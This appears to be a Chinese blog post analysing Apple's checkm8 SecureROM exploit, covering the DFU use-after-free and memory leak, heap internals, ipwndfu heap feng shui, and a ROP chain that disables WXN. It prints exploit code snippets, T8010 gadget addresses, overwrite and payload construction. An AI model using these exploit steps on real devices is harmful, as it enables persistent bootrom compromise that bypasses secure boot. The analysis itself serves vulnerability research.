DFU协议栈这么做的理由是，若主机接收到的数据包长度小于0x40，则表示这是最后一个数据包。若主机请求的数据量大于设备需要传输的实际的数据量，这种情况下设备当然就是有多少数据就传多少数据，如果设备实际传输的数据量是0x40的倍数，那么主机便无法判断最后一个数据包。所以就需要设备主动发送一个zlp表示数据传输完毕。

```c
void usb_core_complete_endpoint_io (struct usb_device_io_request *io_req)
{
	if(io_req->callback) {
		io_req->callback(io_req);
	}  
	free(io_req);
	io_req = NULL;
}

static void standard_device_request_cb (struct usb_device_io_request *req)
{
	if((req->io_length > 0) && ((req->io_length % 0x40) == 0) && 
					(setup_request.wLength > req->io_length)) {
		usb_core_send_zlp();
	}
}
```

需要为zlp再申请一个usb_device_io_request对象，再通过usb_controller_do_endpoint_io函数挂载到ep→io_head链表上。

```c
void usb_core_send_zlp (void){
	struct usb_device_io_request *io_request = 
													alloc_ep0_device_io_request(NULL, 0, NULL);
	......
	usb_controller_do_endpoint_io(io_request);
}
```

再回到synopsys_otg_abort_endpoint函数，此时的ep->io_head链表实际上不会再有任何地方引用，ep->io_head也将随着ep对象的释放而失效，那么刚刚加进去的zlp对象也就失去了引用，没有任何地方能释放zlp，造成了内存泄漏。

所以总结一下checkm8漏洞能够成立的2个要点：

- 仅仅有UAF还不能造成内存破坏
- 配合内存泄漏可以覆盖相邻对象

## 利用思路

构造如下堆布局，在fs conf对象后面分配usb_device_io_request对象。

![checkm8-第 20 页.jpg](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E7%AC%AC_20_%E9%A1%B5.jpg)

堆溢出覆盖usb_device_io_request对象的callback指针和next指针，释放usb_device_io_request对象时就会调用callback函数指针，且参数是对象本身。

释放usb_device_io_request对象时，沿着next指针遍历，可以引导到攻击者构造的区域，实现更多的rop功能。

利用思路概括起来就是：

1. 利用内存泄漏进行堆风水，为UAF覆盖函数指针创造条件
2. UAF覆盖callback函数指针
3. 写入shellcode和ROP链
4. 释放对象触发函数指针调用，劫持程序流到ROP和shellcode

## 堆块控制能力

1. **分配和释放usb_device_io_request对象的时机可控**

堆风水的重要前提是攻击者能够控制堆块的分配和释放，无论这种控制是直接的还是间接的。

- 堆块的分配

攻击者只需要向设备发送一个device to host类型的SETUP package向设备请求数据，就能在堆上分配一个usb_device_io_request对象。

- 堆块的释放

usb_device_io_request被加入ep→io_buffer队列进行数据传输，传输完毕后被销毁，这个过程攻击者无法介入。这种情况下攻击者无法连续分配多个usb_device_io_request对象进行堆排布。

攻击者向设备发送bmRequest=0x80，bRequest=0x6，wLength=0xC0的SETUP package，请求USB设备描述符。

设备描述符的实际长度为0xC6字节，设备按照攻击者的要求传输前0xC0个字节。

```python
def stall(device):   
	libusb1_async_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC0, 0.00001)
```

0.00001秒后主机单方面取消了数据接收，此时设备仅发送了第一个0x40分段。

```python
transfer_ptr = libusb1_create_ctrl_transfer(device, request, request_timeout)
usb.backend.libusb1._lib.libusb_submit_transfer(transfer_ptr)

while time.time() - start < timeout / 1000.0:
  pass

usb.backend.libusb1._lib.libusb_cancel_transfer(transfer_ptr)
```

后续设备一直收不到主机的IN token请求，传输任务阻塞，usb_device_io_request对象滞留在传输队列中。

![截屏2025-03-25 13.50.06.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-25_13.50.06.png)

主机向设备发送RESET命令，传输队列中的usb_device_io_request对象被全部释放。

主机通过中断device to host传输的方式，可以精确控制usb_device_io_request对象的分配和释放。

1. **分配连续usb_device_io_request对象**

device to host传输阻塞的过程中，设备还能继续接收新的device to host传输请求，新的usb_device_io_request对象继续加入传输队列。

由于ep→io_head队列是FIFO的进出方式，后进来的usb_device_io_request对象也被阻塞，造成连续分配的效果。

```python
 stall(device)
 for i in range(config.hole):
	 no_leak(device)
```

1. **制造usb_device_io_request对象内存泄漏**

若传输任务的数据量是0x40的倍数，且比实际请求的数据量小，在释放usb_device_io_request对象之前又会申请一个zlp usb_device_io_request对象，该zlp对象失去引用变成内存泄漏。

因此攻击者可以通过控制wLength字段的大小，制造内存泄漏。

```c
static void standard_device_request_cb (struct usb_device_io_request *req)
{
	if((req->io_length > 0) && ((req->io_length % 0x40) == 0) && 
					(setup_request.wLength > req->io_length)) {
		usb_core_send_zlp();
	}
}
```

要注意的是堆块大小不仅包括usb_device_io_request对象，还包括0x40大小的元数据。

## 堆管理器

1. 核心数据结构

Apple自己开发了堆管理器，SecureROM和iBoot阶段使用的都是同一套代码。

实现了malloc、realloc、calloc、free函数，memalign用于分配大内存。

底层实现了heap_malloc和heap_free做具体的分配和释放。

![截屏2025-03-12 14.00.12.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-12_14.00.12.png)

堆管理器的核心数据结构是heap_block、free_block。

![截屏2025-03-12 14.15.00.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-12_14.15.00.png)

heap_block是活动对象的头部元数据，malloc成功之后把指向数据区域的指针返回给用户。

释放对象时，元数据变成free_block，原本的数据区头部会新增next_in_bin和pre_in_bin两个指针，用于加入对应大小的bin链表中。

堆块分配大小都是heap_block对象大小的整数倍，heap_block对象大小为0x40字节。

若小于free_block对象的大小0x50字节，则按照free_block对象大小来分配。

所以分配对象的大小至少为0x50字节。

这么做的目的是在满足用户需求的同时，确保能容纳下堆块的元数据。

```c
size_t required_size(size_t size){
	size += 2*sizeof(struct heap_block) - 1;
	size &= ~(sizeof(struct heap_block) - 1);

	if (size < sizeof(struct free_block)) {
		size = sizeof(struct free_block);
	}

	return size;
}
```

![截屏2025-03-12 14.55.57.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-12_14.55.57.png)

1. 空闲对象链表

bins[32]数组是空闲对象链表的核心，作用是把空闲对象按照大小分类，加入不同的链表中。

![截屏2025-03-12 13.53.05.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-12_13.53.05.png)

计算bin下标的逻辑如下，首先size除以64计算是几个heap_block大小。

32减去size前导0的数量就是bin的下标。

```c
static unsigned compute_bin(size_t size){
	unsigned result;
	size = quantify_size(size);   //计算是几个heap_block大小

	// clz can't operate on > 32-bit values, so return an invalid bin
	// number to force grab_chunk to fail and free_list_add to assert
	if ((uint64_t)size > UINT32_MAX) {
		return NUM_BINS;
	}
	result = NUM_BINS - __builtin_clz((uint32_t)size);
	return result;
}
```

举例来说，若释放对象大小为0x50，除以0x40得1，下标就是32 - 31 = 1，因此加入bin[1]链表。

链表的加入方式是从头部加入。

![checkm8-堆管理器的实现 空闲链表.jpg](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E5%A0%86%E7%AE%A1%E7%90%86%E5%99%A8%E7%9A%84%E5%AE%9E%E7%8E%B0_%E7%A9%BA%E9%97%B2%E9%93%BE%E8%A1%A8.jpg)

1. 空闲对象的合并

释放一个对象时，会检查相邻前后的对象是否活跃，若相邻对象不活跃则与之合并。

首先把相邻的对象从bin链表上取下，修改元数据this_size字段相加。

合并后的对象设置this_free标志位，重新加入到bins链表中。

```c
static struct heap_block *
merge_blocks_left(struct heap_block *left, struct heap_block *right){
	free_list_remove((struct free_block *)(left));  //

	left->this_size += right->this_size;

	if (HEAP_CHECKS) {
		// the right block is going away, so make sure it no longer
		// looks like a real block
		right->this_size = 0;
		right->prev_size = 0;
		right->checksum = 0;
	}

	return left;
}

void heap_free(void *ptr){
	struct heap_block *block = ptr;
	struct heap_block *left;
	struct heap_block *right;
	
	left = prev_block(block);		//指向前一个堆块的heap_block
	right = next_block(block);		//指向后一个堆块的heap_block
	
	block = merge_blocks_left(left, block);
	block = merge_blocks_right(block, right);
	
	block->this_free = 1;
	free_list_add((struct free_block *)block);
}
```

1. 堆块分配策略

计算实际分配大小时，会在用户请求大小的基础上增加堆头元数据的空间，能够分配的最小堆块为0x50，大于0x50的堆块要和0x40对齐。

分配堆块的主要逻辑是grab_chunk函数，从bins链头部开始遍历，表寻找尺寸合适的空闲堆块。

若空闲堆块大于所需空间，那么切分空闲堆块，剩下部分重新加入bins链表。

```c
static void *grab_chunk(size_t size, size_t user_size){
	for (bin= compute_bin(size); bin< NUM_BINS; bin++) {
		struct free_block *curr;
		curr = &bins[bin];
		curr = curr->next_in_bin;
		while (curr) {
			if (sizeof_block(&curr->common) >= size) {
				verify_block_checksum(&curr->common);
				free_list_remove(curr);
				split_tail(&curr->common, size, user_size);

				return curr;
			}
			curr = curr->next_in_bin;
		}
	}
}

void *heap_malloc(size_t size, const char *caller_name){
	size_t size_r;
	struct heap_block *retval;
	
	size_r = required_size(size);
	retval = grab_chunk(size_r + size_d, size);
	return retval;
}
```

1. 堆的初始化

堆的初始化由heap_add_chunk函数完成，调用路径为_main —> sys_init —> heap_add_chunk。

堆区域从0x1801B4000开始，大小为0x4C000。

heap_add_chunk将0x1801B4040～0x1801FFFC0之间的区域构造成空闲块，放入bins[12]链表中作为第一个链表元素。

初始化完成后，malloc就从bins[12]开始分割所需大小。

![checkm8-第 15 页.jpg](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E7%AC%AC_15_%E9%A1%B5.jpg)

1. 安全检查

verify_block_checksum函数计算堆块元数据heap_block的校验和，与保存在heap_block中的checksum对比，若不相等则触发panic。作用是检查堆块是否被破坏。

在分配和释放操作中很多地方都用到了verify_block_checksum，因此对堆块的保护是比较严格的。

## SecureROM内存布局

SecureROM运行在aarch64状态，并且打开了MMU，页面粒度为16KB，2级页表分页机制，地址总线为36位。

![截屏2025-03-09 13.49.58.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-09_13.49.58.png)

其中页表索引长度为11位，每个页表包含2048个页表项，页表大小为16KB。

![checkm8-虚拟地址划分.jpg](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%88%92%E5%88%86.jpg)

页表初始化路径：_main() → arch_cpu_init() → arm_mmu_init()

![截屏2025-03-09 13.00.49.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-09_13.00.49.png)

L2页表基地址为0x1800A0000

![截屏2025-03-11 08.37.13.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-11_08.37.13.png)

内存布局如下，都是恒等映射，即虚拟地址和物理地址是相等的。

其中代码段和BOOT_TRAMPOLINE段具有可执行权限，堆区域位于0x1801B4000~0x1801FFFF。

在DFU模式下，手机接收的固件会保存在INSECURE_MEMORY区域，固件接收完成后会跳转到这片区域运行。

![checkm8-SecureROM内存布局.jpg](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-SecureROM%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80.jpg)

# ipwndfu分析

## 堆风水

堆风水用到了stall、no_leak、usb_req_leak三个usb接口函数。

```python
 stall(device)
 for i in range(config.hole):        # for i in range(5)
	 no_leak(device)                   # no_leak
 usb_req_leak(device)
 no_leak(device)
 dfu.usb_reset(device)               # 重置USB，释放全部usb_device_io_request对象
 dfu.release_device(device)
```

这些请求的共同参数是：

- bmRequestType = 0x80
- bRequest = 6 (GET_DESCRIPTOR操作)
- wValue = 0x304
    - wValueHigh = 0x3，USB_DT_STRING，获取字符串)
    - wValueLow = 0x4，字符串描述符的下标是4，对应于设备序列号，这台iPhone7的usb序列号是CPID:8010 CPRV:11 CPFM:03 SCEP:01 BDID:0C ECID:001A40362045E526 IBFL:3C SRTG:[iBoot-2696.0.0.1.33]
- wIndex = 0x40A

参数中不同的地方是wLength。

![截屏2025-03-09 12.17.57.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-09_12.17.57.png)

usb_device_io_request加入到端点的IO队列末尾等待处理。

若第一个usb_device_io_request得不到处理，后续的usb_device_io_request也会一直卡住。

```c
static void synopsys_otg_do_endpoint_io(struct usb_device_io_request *req){
	struct usb_endpoint_instance *ep;
	u_int32_t epindex;
    
	epindex = ep_to_epindex(req->endpoint);
	ep = &synopsys_otg_endpoints[epindex];
    
	// pending IOs
	if(ep->io_head) {		//新的usb_device_io_request加入ep端点的IO队列尾部，FIFO
		ep->io_tail->next = req;
		ep->io_tail = req;
		goto exit;
	}
    
	// IO队列是空的
	ep->io_head = ep->io_tail = req;
    
	// start transmitting/receiving the data
	if(ep_to_epdir(req->endpoint)) {
		synopsys_otg_start_endpoint_in(req->endpoint);	//处理DEVICE 2 HOST
	}
	else {
		synopsys_otg_start_endpoint_out(req->endpoint);	//处理HOST 2 DEVICE
	}
}
```

向设备发送重置命令，设备进入到USB重置流程，执行synopsys_otg_abort_endpoint函数，释放IO队列上面的所有usb_device_io_request对象。

调用路径是：handle_interrupt —> synopsys_otg_handle_usb_reset —> usb_core_abort_endpoint —> usb_controller_abort_endpoint —> synopsys_otg_abort_endpoint

synopsys_otg_abort_endpoint先把端点的IO队列整体摘下，保存在aborted_list队列中，通过遍历aborted_list释放所有的usb_device_io_request对象。

释放usb_device_io_request对象先调用callback回调函数，再释放usb_device_io_request对象。

```c
static void synopsys_otg_abort_endpoint(u_int32_t endpoint){

	......
	
	aborted_list = ep->io_head;         //摘下端点的IO队列
	ep->io_head = ep->io_tail = NULL;
	
	......

	while(aborted_list) {
		struct usb_device_io_request *aborted_req = aborted_list;
		aborted_list = aborted_req->next;
		aborted_req->status = USB_IO_ABORTED;
		usb_core_complete_endpoint_io(aborted_req);
	}
}

void usb_core_complete_endpoint_io (struct usb_device_io_request *io_req)
{
	if(io_req->callback) {
		io_req->callback(io_req);
	}  
	free(io_req);
	io_req = NULL;
}
```

callback回调函数是standard_device_request_cb。

req→io_length是设备向主机返回的字符串的长度，对应于wLength。

setup_request.wLength取最后一次setup报文的wLength值，no_leak是堆风水过程中最后一次操作setup报文，因此setup_request.wLength = 0xC1。

若usb_device_io_request::io_length是0x40对齐，那么向主机回一个zero length packet零长度数据包。

```c
static void standard_device_request_cb (struct usb_device_io_request *req){
	if((req->io_length > 0) && ((req->io_length % 0x40) == 0) && 
		(setup_request.wLength > req->io_length)) {
		usb_core_send_zlp();
	}
}
```

usb_core_send_zlp申请一个usb_device_io_request对象，调用usb_controller_do_endpoint_io重新加入到端点的IO队列中。

zlp对象会驻留在堆上，不会被synopsys_otg_abort_endpoint释放。

```c
void usb_core_send_zlp (void){
	struct usb_device_io_request *;
	//申请usb_device_io_request
	io_request = alloc_ep0_device_io_request(NULL, 0, NULL);
	......
	
  //加入EP0端点的IO队列
	usb_controller_do_endpoint_io(io_request);
}
```

堆风水的目的是形成两个zlp对象卡位，这样第二轮getDFUImage的堆布局就会发生变化，此时往ep0_data_phase_buffer指向的缓冲区写数据就会造成堆溢出，覆盖usb_device_io_request对象的callback和next指针。

![checkm8-堆风水.jpg](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E5%A0%86%E9%A3%8E%E6%B0%B4.jpg)

## 堆模拟器

在第二轮getDFUImage中向ep0_data_phase_buffer指向的缓冲区写入多少字节可以抵达usb_device_io_request对象？

在分配usb_device_io_request对象之前，getDFUImage先分配一些对象：

- 分配各种字符串描述符
    - Nonce（234字节）
    - Manufacturer（22字节）
    - Product（62字节）
    - Serial Number（198字节）
    - Configuration string （62字节）
- USB任务资源
    - synopsys_otg_task任务的task structure（0x3C0字节）
    - synopsys_otg_task任务的栈（0x1000字节）
- io_buffer（0x800字节）
- 配置描述符
    - High-Speed（25字节）
    - Full-Speed（25字节）

![checkm8-覆盖距离.jpg](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E8%A6%86%E7%9B%96%E8%B7%9D%E7%A6%BB.jpg)

把堆的实现代码拿到Ubunut22.04下进行重构，模拟上述初始化过程的对象分配，计算出覆盖距离：
为0x5C0。

![截屏2025-03-13 14.40.01.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-13_14.40.01.png)

## 控制流劫持

libusb1_async_ctrl_transfer向设备发起DFU_DNLOAD请求，在等待0.0001秒之后取消数据传输。在此过程中handle_interface_request函数把io_buffer指针赋值给ep0_data_phase_buffer。

libusb1_no_error_ctrl_transfer向设备发出DFU_CLR_STATUS请求，getDFUImage释放USB资源，2个zlp对象驻留在堆上面。

```python
  libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001)
  libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)  #触发漏洞
```

这两步完成之后堆的布局如下：

![checkm8-第 23 页.jpg](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E7%AC%AC_23_%E9%A1%B5.jpg)

usb_req_leak会在第二轮getDFUImage过程中在堆上申请到一个usb_device_io_request对象用于被覆盖。

覆盖到callback和next指针的距离是0x5E0，分别用t8010_nop_gadget和0x1800B0800覆盖callback和next指针。

```python

t8010_nop_gadget = 0x10000CC6C
t8010_overwrite = '\0' * 0x5c0 + struct.pack('<32x2Q', \
											t8010_nop_gadget, 0x1800B0800)
											
for i in range(config.leak): # for i in range(1)
	usb_req_leak(device)       # 分配usb_device_io_request对象被覆盖

#覆盖usb_device_io_request对象的callback和next指针
libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, t8010_overwrite, 100)
```

向设备发送重置命令，设备进入到USB重置流程，执行synopsys_otg_abort_endpoint函数，释放io链表上面的所有usb_device_io_request对象。

```c
static void synopsys_otg_abort_endpoint(u_int32_t endpoint){

	......
	
	aborted_list = ep->io_head;
	ep->io_head = ep->io_tail = NULL;
	
	......

	while(aborted_list) {
		struct usb_device_io_request *aborted_req = aborted_list;
		aborted_list = aborted_req->next;
		aborted_req->status = USB_IO_ABORTED;
		usb_core_complete_endpoint_io(aborted_req);
	}
}
```

在释放usb_device_io_request对象之前，会调用usb_device_io_request::callback回调函数控制流被劫持到t8010_nop_gadget。

```c
void usb_core_complete_endpoint_io (struct usb_device_io_request *io_req){
	if(io_req->callback) {
		io_req->callback(io_req);
	}
    
	free(io_req);
	io_req = NULL;
}
```

# ROP过程分析

## 拷贝ROP链

向手机发送bmRequest=0x21，bRequest=1的数据传输Transaction，开始DFU下载过程，payload最终会拷贝到INSECURE_MEMORY区域。

```c
for i in range(0, len(payload), 0x800):
    libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 100)
```

payload被拆分成为2次Transaction进行传输，每个Transaction分别写入发送2048字节和352字节。

![发送payload抓包.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E5%8F%91%E9%80%81payload%E6%8A%93%E5%8C%85.png)

payload的构造函数如下，包含了shellcode、伪造页表项、关闭WXN的指令片段、ROP链。

```python
def payload(cpid):
	return struct.pack('<1024sQ504x2Q496s32x', t8010_shellcode, \
	0x1000006A5, 0x60000180000625, 0x1800006A5, \
	prepare_shellcode('t8010_t8011_disable_wxn_arm64')) \
	+ usb_rop_callbacks(0x1800B0800, t8010_func_gadget, t8010_callbacks)
```

![checkm8-rop链大概结构.jpg](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-rop%E9%93%BE%E5%A4%A7%E6%A6%82%E7%BB%93%E6%9E%84.jpg)

## ROP链的推进

usb_device_io_request::next指针覆盖为0x1800B0800，指向攻击者在INSECURE_MEMORY区域构造的faka usb_device_io_request对象。

usb_device_io_request::callback函数指针覆盖为0x10000CC6C。

![截屏2025-03-10 15.43.00.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-10_15.43.00.png)

这条gadget做了一件事情，跳过free(io_req)直接回到while(aborted_list)循环，去执行下一个fake usb_device_io_request对象的callback回调函数。

这么做的原因是，覆盖callback和next指针的过程中已经破坏了usb_device_io_request对象所在堆块的元数据，此时free就会引发panic异常。

```c
void usb_core_complete_endpoint_io (struct usb_device_io_request *io_req){
	if(io_req->callback) {
		io_req->callback(io_req);
	}
    
	free(io_req);
	io_req = NULL;
}

static void synopsys_otg_abort_endpoint(u_int32_t endpoint){

	......
	
	aborted_list = ep->io_head;
	ep->io_head = ep->io_tail = NULL;
	
	......

	while(aborted_list) {
		struct usb_device_io_request *aborted_req = aborted_list;
		aborted_list = aborted_req->next;
		aborted_req->status = USB_IO_ABORTED;
		usb_core_complete_endpoint_io(aborted_req);
	}
}
```

保存usb_core_complete_endpoint_io函数返回地址的X30寄存器一开始就被保存在了栈上面，所以gadget的作用就是把X30出栈，即可直接返回到while(aborted_list)，如此就绕过了free(io_req)，避免了panic，同时把链表推进到了在INSECURE_MEMORY区域构造的fake usb_device_io_request。

![截屏2025-03-10 16.03.27.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-10_16.03.27.png)

每个fake usb_device_io_request对象通过递增next指针，可实现[callback，next]序列紧密排列，while(aborted_list)循环便可以往下推进，每一轮循环调用一次callback函数指针，实现类似于rop链的功能。最后一个fake usb_device_io_request对象的next指针为NULL，表示停止循环。

![checkm8-rop链大概结构2.jpg](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-rop%E9%93%BE%E5%A4%A7%E6%A6%82%E7%BB%93%E6%9E%842.jpg)

## “f(x)”指令片段

fake usb_device_io_request对象的callback指针都是统一的func_gadget，地址为0x10000CC4C。

callback的参数就是fake usb_device_io_request对象本身，根据aarch64函数调用的参数约定，X0寄存器保存第1个参数，因此X0保存fake usb_device_io_request对象的地址。

因此func_gadget执行的效果是把fake usb_device_io_request对象偏移0x70处和0x78处的数据分别作为函数的参数和函数本身，进行一次f(x)调用。

在退出func_gadget的时候，同样也是跳过free(io_req)，直接返回到synopsys_otg_abort_endpoint函数的while(aborted_list)循环中，执行下一条func_gadget。

![截屏2025-03-10 17.01.50.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-10_17.01.50.png)

这么做的现实根据是什么？

func_gadget的选取并非随机巧合，f(x)调用其实相当于对象本身方法的调用，面向对象编程思想在代码中应该会有很多地方体现。

## 关闭WXN

ROP链的作用是关闭WXN，使得位于0x1800B000～0x1800B400之间的shellcode可执行。

SecureROM在arch_cpu_init函数中使能了WXN（Write XOR eXecute Never）功能。WXN确保内存区域不能同时具有写和执行权限。如果一个内存区域被标记为可写，则不能同时标记为可执行，反之亦然。当WXN启用时，处理器会自动将可写内存区域标记为不可执行，防止恶意代码通过写入内存并执行来攻击系统。

```c
int arch_cpu_init(bool resume)
{
	......
	
	uint64_t sctlr;
	sctlr = arm_read_sctlr();

	/* turn on Stack Alignment check */
	sctlr |= SCTLR_SA_ENABLED;

	/* turn on the mmu */
	arm_mmu_init(resume);
	sctlr |= SCTLR_M_ENABLED;

	/* disallow executing from writeable pages */
	sctlr |= SCTLR_WXN_ENABLED;//使能WXN

	/* turn on d-cache */
	sctlr |= SCTLR_D_ENABLED;

	/* turn on i-cache */
	sctlr |= SCTLR_I_ENABLED;

	/* enable the MMU, caches and etc. */
	arm_write_sctlr(sctlr);
	
	......

	return 0;
}
```

ROP链中使用到的地址如下：

```python
t8010_func_gadget = 0x10000CC4C
t8010_enter_critical_section = 0x10000A4B8
t8010_exit_critical_section = 0x10000A514
t8010_dc_civac = 0x10000046C
t8010_write_ttbr0 = 0x1000003E4
t8010_tlbi = 0x100000434
t8010_dmb = 0x100000478
t8010_handle_interface_request = 0x10000DFB8
```

1. t8010_dc_civac(0x1800B0600)

使虚拟地址0x1800B0600对应的缓存行失效，确保后面CPU能正确执行disable_wxn_arm64代码。

```c
.shellcode:000000010000046C                 DC              CIVAC, X0
.shellcode:0000000100000470                 RET
```

1. t8010_dmb(0)

内存屏障指令，确保该指令之前的所有指令都已经执行完毕。高性能处理器会打乱指令执行的顺序，有时候需要手动同步。

```c
.shellcode:0000000100000478                 DMB             SY
.shellcode:000000010000047C                 RET
```

1. t8010_enter_critical_section(0)

屏蔽中断，确保后续修改页表的操作是原子操作。

1. t8010_write_ttbr0(0x1800B0000)

设置页表基地址寄存器TTBR0_EL1的值为0x1800B0000。

```c
.shellcode:00000001000003E4                 MSR             TTBR0_EL1, X0
.shellcode:00000001000003E8                 ISB
.shellcode:00000001000003EC                 RET
```

攻击者写入INSECURE_MEMORY区域的payload也被视为页表。

![checkm8-伪造页表.jpg](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E4%BC%AA%E9%80%A0%E9%A1%B5%E8%A1%A8.jpg)

上文提到SecureROM把MMU配置为使用2级页表，16KB页面。

0x100000000 -> 0x100000000 (rx)和0x180000000 -> 0x180000000 (rw)维持原地址映射关系不变，确保代码段能正常执行。

0x182000000 -> 0x180000000 (rx)是攻击者新增的页表项，作用是将payload单独映射成一个具有执行权限的段，下步可以执行disable_wxn_arm64指令。

![checkm8-做了两份映射.jpg](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E5%81%9A%E4%BA%86%E4%B8%A4%E4%BB%BD%E6%98%A0%E5%B0%84.jpg)

那么攻击者为什么不直接修改0x180000000 -> 0x180000000 (rx)呢？

答：因为在执行disable_wxn_arm64关闭WXN之前，R(读)和X(执行)只能同时拥有一个，如果直接设置0x180000000 -> 0x180000000 (rx)，后续disable_wxn_arm64中就无法对旧的页表进行修改，上文提到旧的L2页表位于0x1800A0000。

```c
                                       VA             PA
...
0x1800B0400: 0x1000006a5           0x100000000 -> 0x100000000 (rx)
...
0x1800B0600: 0x60000180000625      0x180000000 -> 0x180000000 (rw)
0x1800B0608: 0x1800006a5           0x182000000 -> 0x180000000 (rx)
...
```

页表项后缀为0x6a5表示读/执行权限，指向块类型页面。在2级页表，16KB页面粒度的配置下，块类型页面的大小为32MB，块类型页面是直接返回给系统使用的页面类型。

页表项前缀为0x6后缀为0x625表示读/写权限，没有执行权限，指向块类型页面，长度为32MB。

![checkm8-页表属性.jpg](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E9%A1%B5%E8%A1%A8%E5%B1%9E%E6%80%A7.jpg)

1. t8010_tlbi(0)

使TLB缓存记录失效，使用新的页表进行地址转换。

```c
.shellcode:0000000100000434                 DSB             SY
.shellcode:0000000100000438                 TLBI            VMALLE1
.shellcode:000000010000043C                 DSB             SY
.shellcode:0000000100000440                 ISB
.shellcode:0000000100000444                 RET
```

1. 0x1820B0610 — disable_wxn_arm64(0)

disable_wxn_arm64指令片段起始地址0x1820B0610，映射到物理地址0x1800B0610，可执行。

把旧的L2页表中，虚拟地址0x180000000的映射关系不变，去掉了PXN和NX位，获得了执行权限，空间长度为32MB，并且关闭了WXN。payload所在的INSECURE_MEMORY段因此也变为可读可执行。

因为后面执行t8010_shellcode要求BOOT_TRAMPOLINE段同时具有RWX权限，因此要禁用WXN。

![截屏2025-03-11 09.56.28.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-11_09.56.28.png)

在arm_mmu_init()函数初始化页表的过程中，不可执行段的页表项设置了PXN和XN比特位，在disable_wxn_arm64中把这两个位清零，使得页面具有执行权限。

![截屏2025-03-11 10.12.13.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-11_10.12.13.png)

1. t8010_write_ttbr0(0x1800A0000)

恢复旧的页表。因为旧的页表中还包含设备IO寄存器地址到虚拟地址空间的映射，恢复旧页表确保系统功能正常。

![截屏2025-03-09 13.00.49.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-09_13.00.49.png)

1. t8010_tlbi(0)

使TLB缓存记录失效，使用新的页表进行地址转换。

1. t8010_exit_critical_section(0)

恢复中断。

## 跳转到shellcode执行

经过上面的步骤，虚拟地址0x180000000～0x182000000获得RWX权限。

while(aborted_list)循环调用最后一个callback，进入0x1800B0000执行t8010_shellcode代码。

![checkm8-rop链大概结构-进入shellcode运行.jpg](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-rop%E9%93%BE%E5%A4%A7%E6%A6%82%E7%BB%93%E6%9E%84-%E8%BF%9B%E5%85%A5shellcode%E8%BF%90%E8%A1%8C.jpg)

## crauEmu插件模拟ROP过程

crauEmu是基于uEmu开发的IDA插件，相比于uEmu增加了rop调试功能，使rop过程可视化。

这里模拟控制流劫持后，usb_rop_callbacks的执行过程。

- 初始设置

synopsys_otg_abort_endpoint函数的while(aborted_list)循环开始ROP链的执行。

```c
void usb_core_complete_endpoint_io (struct usb_device_io_request *io_req){
	if(io_req->callback) {
		io_req->callback(io_req);
	}
    
	free(io_req);
	io_req = NULL;
}

static void synopsys_otg_abort_endpoint(u_int32_t endpoint){

	......
	
	aborted_list = ep->io_head;
	ep->io_head = ep->io_tail = NULL;
	
	......

	while(aborted_list) {
		struct usb_device_io_request *aborted_req = aborted_list;
		aborted_list = aborted_req->next;
		aborted_req->status = USB_IO_ABORTED;
		usb_core_complete_endpoint_io(aborted_req);
	}
}
```

crauEmu设置PC指针为0x1000055D4，该地址对应while(aborted_list)循环的入口。

X19寄存器设置为0x1800B0800，对应第一个fake usb_device_io_request对象。

fake usb_device_io_request的next指针指向下一个fake usb_device_io_request，保存在X21寄存器中，作为循环变量。

